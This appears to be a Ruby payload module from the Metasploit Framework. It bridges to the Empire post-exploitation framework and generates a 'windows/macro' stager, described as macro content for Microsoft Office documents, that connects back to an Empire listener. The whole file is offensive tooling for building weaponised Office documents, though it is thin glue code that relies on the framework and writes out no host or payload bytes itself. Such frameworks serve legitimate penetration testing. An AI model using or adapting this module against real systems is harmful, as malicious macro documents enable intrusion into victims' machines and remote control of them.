##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'msf/core/payload/empire_single.rb'

module MetasploitModule

  include Msf::Payload::EmpireSingle

  def initialize(info={})
    super(merge_info(info,
    'Description'=> 'Creates the Macro Content for Microsoft Office Documents for Empire'
    ))
  end

  def stagerGenerator(empireClient)
    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/macro')
    return @stagerCode
  end
end
